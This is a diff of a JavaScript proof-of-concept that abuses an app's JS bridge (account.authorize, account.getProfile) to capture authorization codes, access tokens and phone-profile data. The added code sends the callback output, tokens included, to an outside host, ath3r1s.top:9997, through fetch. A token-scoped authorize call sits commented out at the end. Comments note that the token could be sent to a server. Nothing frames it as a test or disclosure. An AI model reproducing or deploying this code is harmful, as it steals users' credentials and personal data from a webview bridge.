@@ -5,7 +5,36 @@ function whoami() {
     output += `参数 ${i + 1}: ${arguments[i]}\n`;
   }
   alert(output);
+  fetch("https://ath3r1s.top:9997/?output="+output)
 }
 
-pay.pay('{"callbackFunc":"whoami","orderInfo":{"cpOrderId":"123","productName":"Shit","productDesc":"shit","callBackUrl":"https://baidu.com","price":1,"attach":"123","appKey":"123","appId":"123","timestamp":"123","sign":"123"}}')
+account.authorize('{"type":"code","callbackFunc":"whoami"}');
+
+function getProfile(statusCode, statusMessage, profileDataJson) {
+  let accessToken = null;
+
+  try {
+    const profileData = JSON.parse(profileDataJson);
+    if (profileData && profileData.accessToken) {
+      accessToken = profileData.accessToken;
+      alert(`Access Token: ${accessToken}`);
+    } else {
+      alert("无法在 JSON 数据中找到 'accessToken'。");
+    }
+  } catch (error) {
+    alert("解析 JSON 数据时发生错误。");
+    console.error("JSON 解析错误:", error);
+  }
+
+  // 您可以在这里添加其他处理逻辑，例如将 accessToken 发送到服务器等
+  console.log("Status Code:", statusCode);
+  console.log("Status Message:", statusMessage);
+  console.log("Profile Data JSON:", profileDataJson);
+  console.log("Extracted Access Token:", accessToken);
+
+  account.getProfile('{"token": "${accessToken}", "callbackFunc": "whoami"}')
+  return accessToken; // 可选：返回提取到的 accessToken
+}
+
+// account.authorize('{"type":"token", "scope":"scope.basePhoneProfile" ,"callbackFunc":"getProfile"}');
 </script>
